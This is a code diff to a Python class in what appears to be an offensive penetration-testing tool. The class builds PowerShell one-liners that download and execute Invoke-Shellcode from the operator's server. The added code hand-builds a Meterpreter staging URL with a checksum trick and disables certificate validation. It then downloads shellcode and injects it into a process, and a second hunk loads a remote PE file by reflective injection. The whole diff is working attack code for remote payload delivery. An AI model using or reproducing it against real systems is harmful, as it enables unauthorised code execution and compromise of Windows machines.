@@ -92,15 +92,38 @@ class PowerShell:
         return ps_command(command)
 
     def inject_meterpreter(self):
+        #PowerSploit's 3.0 update removed the Meterpreter injection options in Invoke-Shellcode
+        #so now we have to manually generate a valid Meterpreter request URL and download + exec the staged shellcode
+        
         command = """
-        IEX (New-Object Net.WebClient).DownloadString('{0}://{1}:{2}/Invoke-Shellcode.ps1');
-        Invoke-{3} -Force -Payload windows/meterpreter/{4} -Lhost {5} -Lport {6}""".format(self.protocol,
-                                                                                           settings.args.server_port,
-                                                                                           self.localip,
-                                                                                           self.func_name,
-                                                                                           settings.args.inject[4:],
-                                                                                           settings.args.met_options[0],
-                                                                                           settings.args.met_options[1])
+        IEX (New-Object Net.WebClient).DownloadString('{}://{}:{}/Invoke-Shellcode.ps1');
+
+        $UserAgent = (Get-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings').'User Agent'
+        $CharArray = 48..57 + 65..90 + 97..122 | ForEach-Object {{[Char]$_}}
+        $SumTest = $False
+
+        while ($SumTest -eq $False) 
+        {{
+            $GeneratedUri = $CharArray | Get-Random -Count 4
+            $SumTest = (([int[]] $GeneratedUri | Measure-Object -Sum).Sum % 0x100 -eq 92)
+        }}
+
+        [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {{$True}}
+        $RequestUri = -join $GeneratedUri
+        $Request = "{}://{}:{}/$($RequestUri)" 
+ 
+        $Uri = New-Object Uri($Request)
+        $WebClient = New-Object System.Net.WebClient
+        $WebClient.Headers.Add('user-agent', "$UserAgent")
+        [Byte[]] $bytes = $WebClient.DownloadData($Uri)
+
+        Invoke-{} -Force -Shellcode $bytes""".format(self.protocol,
+                                                     self.localip,
+                                                     settings.args.server_port,
+                                                     settings.args.inject.split('_')[-1],
+                                                     settings.args.met_options[0],
+                                                     settings.args.met_options[1],
+                                                     self.func_name)
         if settings.args.procid:
             command += " -ProcessID {}".format(settings.args.procid)
 
@@ -129,17 +152,19 @@ class PowerShell:
     def inject_exe_dll(self):
         command = """
         IEX (New-Object Net.WebClient).DownloadString('{protocol}://{addr}:{port}/Invoke-ReflectivePEInjection.ps1');
-        Invoke-{func_name} -PEUrl {protocol}://{addr}:{port}/{pefile}""".format(protocol=self.protocol,
-                                                                                port=settings.args.server_port,
-                                                                                func_name=self.func_name,
-                                                                                addr=self.localip,
-                                                                                pefile=settings.args.path.split('/')[-1])
+        $WebClient = New-Object System.Net.WebClient;
+        [Byte[]]$bytes = $WebClient.DownloadData('{protocol}://{addr}:{port}/{pefile}');
+        Invoke-{func_name} -PEBytes $bytes""".format(protocol=self.protocol,
+                                                     port=settings.args.server_port,
+                                                     func_name=self.func_name,
+                                                     addr=self.localip,
+                                                     pefile=settings.args.path.split('/')[-1])
 
         if settings.args.procid:
-            command += " -ProcID {}"
+            command += " -ProcId {}"
 
         if settings.args.inject == 'exe' and settings.args.exeargs:
-            command += " -Exesettings.args \"{}\"".format(settings.args.exeargs)
+            command += " -ExeArgs \"{}\"".format(settings.args.exeargs)
 
         command += ';'
 
